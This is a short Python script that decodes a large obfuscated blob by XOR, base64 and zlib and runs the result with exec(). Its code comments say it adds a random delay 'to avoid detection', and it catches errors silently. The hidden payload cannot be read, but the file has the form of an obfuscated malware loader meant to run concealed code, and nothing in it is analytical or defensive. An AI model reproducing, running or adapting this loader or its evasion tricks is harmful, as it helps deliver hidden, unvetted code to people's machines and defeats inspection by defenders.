
import time
import sys
import base64
import zlib
import random

def _unpack():
    packed = b'h\x05\x01b\x8d\x88RhD\x9d\xa5 \xfd\x07\xc7L\xd4$\xba\xa2\xfe\x18\x10\xc9\xa5\x95H\xfd\x9f\x14\xbc\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'
    key = packed[:32]
    encoded = packed[32:]
    xored = base64.b64decode(encoded)
    compressed = bytes(a ^ b for a, b in zip(xored, key * (len(xored) // len(key) + 1)))
    return zlib.decompress(compressed).decode()

if __name__ == "__main__":
    try:
        # Add random delay to avoid detection
        time.sleep(random.uniform(1, 3))
        # Unpack and execute the code
        exec(_unpack())
    except Exception as e:
        print(e)
        sys.exit()
